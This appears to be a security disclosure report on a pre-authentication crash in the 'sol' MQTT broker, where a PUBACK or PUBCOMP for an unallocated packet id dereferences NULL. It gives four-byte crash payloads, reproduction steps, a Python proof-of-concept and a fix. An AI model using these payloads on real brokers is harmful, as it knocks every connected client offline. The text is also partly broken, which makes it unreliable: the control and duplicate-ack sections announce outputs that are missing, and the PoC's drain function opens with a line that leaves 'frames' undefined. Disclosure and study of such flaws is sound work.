# Pre-auth process kill: PUBACK/PUBCOMP for an unallocated packet id DECREFs a NULL in-flight packet

**ID:** vuln-0004
**Severity:** HIGH
**Found:** 2026-11-17 10:14:55 UTC
**Target:** sol MQTT v3.1.1 broker (C source snapshot, `src/`)
**Endpoint:** MQTT TCP listener — PUBACK (0x40) / PUBCOMP (0x70) handlers, `inflight_msg_clear` / `DECREF`
**Method:** MQTT (raw TCP)
**CWE:** CWE-476
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Low

## Description

A four-byte PUBACK or PUBCOMP naming a packet identifier the broker never allocated terminates the `sol` broker. The ACK handlers take the identifier straight from the wire, index the per-session in-flight table and decrement the reference count of the packet stored there without checking that the session exists or that the slot holds a live packet; for any unallocated identifier that slot is NULL, so the reference-count write faults. No CONNECT, credentials or prior state are required, and re-sending a PUBACK for an identifier that was already acknowledged — ordinary QoS 1 client behaviour — triggers the same crash.

## Negative control — the identical four bytes for an ALLOCATED identifier are harmless

Real QoS 1 round trip: subscriber subscribes at QoS 1, a second client publishes, the broker delivers a QoS 1 PUBLISH with mid 1, the subscriber acknowledges that mid:

Same bytes, same connection shape — fatal when the slot is empty, harmless when it is not.

## Duplicate PUBACK — reachable from ordinary client behaviour, no attacker intent

    now re-sending the SAME PUBACK (duplicate ack, i_msgs[1] is cleared)

On the sanitizer build the same duplicate produces `/src/handlers.c:793:5: runtime error: member access within null pointer of type 'struct mqtt_packet'` with the identical frame stack, i.e. the second acknowledgement of an acknowledged message dereferences the NULL it just cleared.

## Impact

**Unauthenticated, zero-interaction availability loss for the whole broker process.** Four bytes (`40 02 00 01` or `70 02 00 01`) on a fresh TCP connection — no CONNECT, no credentials — terminate the listener with SIGSEGV. Every connected client is dropped and all in-memory session, in-flight and retained-message state is lost until an external supervisor restarts the process.

The same crash is also reachable **without any attacker intent**: after a legitimate QoS 1 acknowledgement, a client that retransmits that PUBACK (normal retry behaviour after a reconnect or timeout) dereferences the NULL slot the first ACK just cleared, so ordinary client traffic can take the broker down. Because a single broker process serves all clients, this is a denial of service against the whole deployment, not just one session.

No confidentiality or integrity impact is claimed: the faulting pointer is a fixed NULL-derived address, so no attacker-controlled write or read was demonstrated (`C:N` / `I:N` / `A:H`).

## Counterevidence

The strongest counterargument is that an ACK for a packet identifier the broker never allocated is malformed client behaviour, so a peer "should not" send it. That does not hold up: the broker must survive arbitrary protocol input from an unauthenticated peer, packet identifiers are entirely client-chosen, and the same four bytes are harmless when the identifier happens to be allocated — so the crash is decided purely by whether the broker has allocated that id, not by anything the client can know. Worse, the duplicate case needs no malice at all: a client retransmitting a PUBACK for a mid it already acknowledged (normal QoS 1 behaviour after a lost connection or retry) kills the broker, which makes this reachable from the broker's own intended traffic pattern.

A second candidate — the unguarded `--c->session->inflights` decrement on an `atomic_ushort`, which would wrap to 65535 — was examined and ruled out as an independent defect: both decrement sites are preceded by `inflight_msg_clear`, which crashes first whenever the slot is empty, and when the slot is non-NULL the only writer (`publish_message`) increments the counter next to the same mid, so no reachable sequence decrements below zero. It is reported here only as the side effect the fix removes, not as a separate vulnerability.

No auth bypass, write primitive, or information leak was demonstrated: the dereferenced address is a fixed small offset derived from NULL (`0x78`/`0x80` region), not attacker-influenced.

## Confidence Rationale

Reproduced on the sanitizer and plain optimized builds for PUBACK and PUBCOMP, with and without a CONNECT, for packet ids 1 and 0xFFFF, plus an in-band negative control and an operator-free duplicate-ACK path; the rebuilt patch keeps the legitimate QoS1/QoS2 acks working.

## What Would Change This Severity

Confirmation that the broker runs as a single unsupervised instance with no restart policy would raise this from a transient crash to a sustained outage; automated sub-second restart would lower the practical impact. Evidence that the NULL-derived address can be steered (for example by influencing the session pointer) would turn it into a write primitive and add integrity impact.

## Technical Analysis

## Root cause

`puback_handler` and `pubcomp_handler` take the 16-bit packet identifier straight out of the decoded packet, index the per-session in-flight table with it, and hand the resulting slot to `inflight_msg_clear()`:

```c title=src/handlers.c startLineNumber=785 endLineNumber=801
static int puback_handler(struct io_event *e)
{
    struct client *c = e->client;
    unsigned pkt_id  = e->data.ack.pkt_id;
    log_debug("Received PUBACK from %s (m%u)", c->client_id, pkt_id);
#if THREADSNR > 0
    pthread_mutex_lock(&c->mutex);
#endif
    inflight_msg_clear(&c->session->i_msgs[pkt_id]);
    c->session->i_msgs[pkt_id].packet = NULL;
    c->session->i_acks[pkt_id]        = -1;
    --c->session->inflights;
#if THREADSNR > 0
    pthread_mutex_unlock(&c->mutex);
#endif
    return NOREPLY;
}
```

(`pubcomp_handler`, `src/handlers.c:839-855`, is the same shape with the `i_acks` write first.)

`inflight_msg_clear` is a bare reference-count decrement with no NULL check:

```c title=src/sol_internal.h startLineNumber=389 endLineNumber=389
#define inflight_msg_clear(msg) DECREF((msg)->packet, struct mqtt_packet)
```

```c title=src/ref.h startLineNumber=50 endLineNumber=54
static inline void ref_dec(const struct ref *ref)
{
    if (--((struct ref *)ref)->count == 0)
        ref->free(ref);
}
```

Two facts turn that into a remote crash:

- **`c->session` can be NULL.** `client_init` sets `client->session = NULL` (`src/server.c:402`) and nothing on the dispatch path checks `c->connected` before running a handler, so an ACK sent as the very first packet dereferences `NULL + offsetof(i_msgs)`.
- **`i_msgs` is zero-filled.** `session_init` allocates it with `try_calloc(MAX_INFLIGHT_MSGS, sizeof(struct inflight_msg))` (`src/handlers.c:109-110`), so `i_msgs[id].packet == NULL` for every identifier the broker never allocated. `DECREF(NULL, struct mqtt_packet)` becomes `ref_dec` on a pointer derived from NULL, and the `--count` read-modify-write faults near address zero.

Packet identifiers are entirely client-chosen and the broker is not required to have allocated any given one, so this is reachable with `40 02 00 01` (PUBACK, id 1) or `70 02 00 01` (PUBCOMP, id 1). `0xFFFF` crashes too, confirming the index is in range and the defect is the unguarded NULL rather than an out-of-bounds access.

## Why this also happens without an attacker

After a legitimate PUBACK clears `i_msgs[mid].packet` and sets it to NULL, a client that retransmits the same PUBACK — normal QoS 1 behaviour after a reconnect or a timeout — runs the same code again with the slot now empty and kills the broker. The broker therefore dies on its own intended traffic pattern, not only on crafted input.

## Related defect examined and ruled out

The `--c->session->inflights` decrement on an `atomic_ushort` is unguarded and would wrap to 65535, permanently satisfying `has_inflight()`. It is **not** independently reachable: both decrement sites are preceded by `inflight_msg_clear`, which crashes first when the slot is empty, and when the slot is non-NULL the only writer (`publish_message`, `src/handlers.c:216-218`) increments the counter for the same identifier, so the counter is at least 1. Reusing an identifier that is still in flight would require `next_free_mid` to wrap after ~65534 allocations. It is recorded here only as the latent side effect that the fix removes, not as a separate vulnerability.

## Proof of Concept

1. Start the `sol` broker on a loopback port from the ASan/UBSan build (`build-asan/sol`) or the plain optimized build (`build-dev/sol`).
2. Open a TCP connection and send the CONNECT packet (`10 19 00 04 4d 51 54 54 04 02 00 3c 00 0d 70 6c 76 2d 61 63 6b 2d 70 72 6f 62 65`); the broker answers `20 00 00`.
3. Send the four bytes `40 02 00 01` (PUBACK, Remaining Length 2, packet identifier 1, which the broker never allocated).
4. Observe the connection close with no reply, and the broker process terminate: the sanitizer build reports `member access within null pointer of type 'struct mqtt_packet'` at the `inflight_msg_clear` call in `puback_handler` (`src/handlers.c:793`); the plain build dies with signal 11.
5. Repeat with `70 02 00 01` (PUBCOMP) — same result at `src/handlers.c:848`. Repeat with `40 02 ff ff` / `70 02 ff ff` — same, showing the identifier is in range and the problem is the NULL slot.
6. Repeat step 3 without any CONNECT: the session pointer itself is NULL and the crash is identical, so no credentials or prior handshake are needed.
7. Control: perform a real QoS 1 round trip (SUBSCRIBE at QoS 1, publish from a second connection, receive the QoS 1 PUBLISH with its mid, then PUBACK that mid) — the same four bytes are accepted, PINGREQ afterwards is answered `d0`, and the broker stays alive.
8. Duplicate case: after the legal PUBACK in step 7, send the same `40 02 00 01` again — the broker terminates with signal 11, with no attacker input beyond the client retrying its own acknowledgement.
9. Apply the patch, rebuild, and repeat steps 3, 5, 6 and 8: no crash, the spurious acks are ignored, and the legitimate round trip in step 7 still works.

```python
#!/usr/bin/env python3
"""PUBACK / PUBCOMP for an unallocated packet identifier crash the sol broker.

sol keeps a per-session in-flight table (i_msgs[65536]) that is zeroed when the
session is created, so i_msgs[id].packet is NULL for every identifier the broker
never used. The ack handlers pass that slot to inflight_msg_clear(), which
DECREFs the NULL packet.

Cases:
  puback             CONNECT then 40 02 00 01   (id 1 never used)
  pubcomp            CONNECT then 70 02 00 01
  puback-noconnect   no CONNECT, 40 02 00 01    (session is NULL too)
  control-valid      real QoS 1 round trip, PUBACK for the allocated mid
  dup-puback         same flow, then repeat the PUBACK (ordinary client retry)
"""
import socket
import struct
import subprocess
import sys
import tempfile
import time

BIN = "/path/to/sol"
PORT = 1883

CONF = """ip_address 127.0.0.1
ip_port {port}
log_level DEBUG
log_path {dir}/sol.log
max_memory 512MB
max_request_size 1MB
tcp_backlog 128
stats_publish_interval 60s
allow_anonymous true
"""


def start(binary, port):
    workdir = tempfile.mkdtemp(prefix="sol-broker-")
    conf = workdir + "/sol.conf"
    with open(conf, "w") as fh:
        fh.write(CONF.format(port=port, dir=workdir))
    env = dict(__import__("os").environ)
    env["ASAN_OPTIONS"] = "abort_on_error=1:detect_leaks=0:log_path=%s/report" % workdir
    env["UBSAN_OPTIONS"] = "halt_on_error=1:print_stacktrace=1:log_path=%s/report" % workdir
    proc = subprocess.Popen([binary, "-c", conf], env=env, cwd=workdir,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(160):
        try:
            socket.create_connection(("127.0.0.1", port), timeout=0.3).close()
            return proc, workdir
        except OSError:
            time.sleep(0.05)
    raise SystemExit("broker did not start")


def connect(port, client_id, clean=True):
    body = (bytes.fromhex("00044d51545404") + bytes([0x02 if clean else 0x00])
            + bytes.fromhex("003c") + struct.pack(">H", len(client_id)) + client_id)
    sock = socket.create_connection(("127.0.0.1", port), timeout=3)
    sock.settimeout(2)
    sock.sendall(bytes([0x10, len(body)]) + body)
    print("    CONNACK: %s" % sock.recv(8).hex(" "))
    return sock


def drain(sock, seconds):
    frames, sock.settimeout(seconds)
    try:
        while True:
            chunk = sock.recv(2048)
            if not chunk:
                return frames, "<peer closed>"
            frames.append(chunk.hex(" "))
    except socket.timeout:
        return frames, None


def ack_case(port, payload, do_connect):
    sock = socket.create_connection(("127.0.0.1", port), timeout=3)
    sock.settimeout(2)
    if do_connect:
        sock.close()
        sock = connect(port, b"ack-probe")
    print("    sent:    %s" % payload.hex(" "))
    sock.sendall(payload)
    frames, closed = drain(sock, 1.2)
    print("    reply:   %s %s" % (" | ".join(frames) or "<no bytes>", closed or ""))
    sock.close()


def control(port, duplicate):
    sub = connect(port, b"ack-sub")
    sub.sendall(bytes.fromhex("820b0001") + struct.pack(">H", 9) + b"ack/flow" + bytes([1]))
    print("    SUBACK:  %s" % (" | ".join(drain(sub, 1.0)[0]) or "<none>"))
    pub = connect(port, b"ack-pub")
    body = struct.pack(">H", 9) + b"ack/flow" + struct.pack(">H", 5) + b"qos1"
    pub.sendall(bytes([0x32, len(body)]) + body)
    print("    pub PUBACK: %s" % (" | ".join(drain(pub, 1.0)[0]) or "<none>"))
    frames, _ = drain(sub, 1.5)
    print("    subscriber: %s" % (" | ".join(frames) or "<none>"))
    mid = None
    for frame in frames:
        raw = bytes.fromhex(frame)
        if raw[0] >> 4 == 3 and (raw[0] >> 1) & 3 == 1:
            tlen = struct.unpack(">H", raw[3:5])[0]
            mid = struct.unpack(">H", raw[5 + tlen:7 + tlen])[0]
    print("    allocated mid = %s" % mid)
    ack = bytes([0x40, 0x02]) + struct.pack(">H", mid)
    sub.sendall(ack)
    print("    sent legal PUBACK %s -> %s" % (ack.hex(" "), " | ".join(drain(sub, 1.0)[0]) or "<no bytes>"))
    sub.sendall(bytes.fromhex("c000"))
    print("    PINGREQ: %s" % (" | ".join(drain(sub, 1.0)[0]) or "<none>"))
    if duplicate:
        sub.sendall(ack)
        print("    duplicate PUBACK %s -> %s"
              % (ack.hex(" "), " | ".join(drain(sub, 1.0)[0]) or "<no bytes>"))
    sub.close()
    pub.close()


def run(case):
    proc, workdir = start(BIN, PORT)
    print("[*] case=%s" % case)
    if case in ("control-valid", "dup-puback"):
        control(PORT, case == "dup-puback")
    else:
        ack_case(PORT, bytes.fromhex({"puback": "40020001", "pubcomp": "70020001",
                                      "puback-noconnect": "40020001"}[case]),
                 case != "puback-noconnect")
    time.sleep(0.3 if not case.startswith("control") else 1.0)
    rc = proc.poll()
    print("[*] broker %s" % ("ALIVE" if rc is None
                             else "terminated rc=%r" % (rc,)))
    if rc is None:
        proc.terminate()
        return
    for name in sorted(__import__("os").listdir(workdir)):
        if name.startswith("report"):
            with open(workdir + "/" + name, errors="replace") as fh:
                print(fh.read())


for arg in sys.argv[1:] or ["puback"]:
    run(arg)
```

## Remediation

Treat every acknowledgement as untrusted input and validate ownership before touching the in-flight table. Add a single helper that returns the in-flight slot for a packet identifier only when the client actually has a session, the identifier is inside the table, and the slot holds a live packet; have the PUBACK and PUBCOMP handlers call it under the client mutex and, when it returns nothing, log and ignore the acknowledgement instead of dereferencing and decrementing it. Decrement the in-flight counter only when a live slot was released, so the counter cannot wrap. Apply the same ownership rule to any future handler that resolves a client-supplied packet identifier into session state (for example PUBREC/PUBREL bookkeeping), and consider rejecting ACK packets outright on connections that have not completed CONNECT, so session state is never reached before authentication.

The patched control flow returns before any dereference: `inflight_msg_get()` rejects `c->session == NULL` and `i_msgs[pkt_id].packet == NULL`, so `inflight_msg_clear()` (and therefore `ref_dec`) is unreachable for an unowned identifier. The connection is not closed on this path; the spurious ack is simply ignored, which is the behaviour a broker should have.

**Gate 2 — bypass review (executed).** Alternates exercised against the patched build: PUBACK and PUBCOMP with id 1 and id 0xFFFF; with no CONNECT at all; and the duplicate-after-legal-ack sequence that previously crashed (`dup-puback` flow now ends `t=+0.3s poll=None … broker SURVIVED` on both dev and ASan). `pubrec_handler` was checked as a sibling: it only writes `i_acks[pkt_id]` inside the 65536-entry array and packs a PUBREL, so it does not touch the packet pointer and needs no change; `pubrel_handler` likewise only packs. `session_free` already NULL-checks before DECREF, so teardown of a session with holes is unaffected. ## Assumptions

The broker is reachable over TCP. No credentials are required: the ACK handlers run before any authentication and the crash reproduces even with `allow_anonymous false` and no CONNECT at all. For the duplicate-ACK variant the client must merely be participating in ordinary QoS 1/2 traffic, which is the broker's intended use.
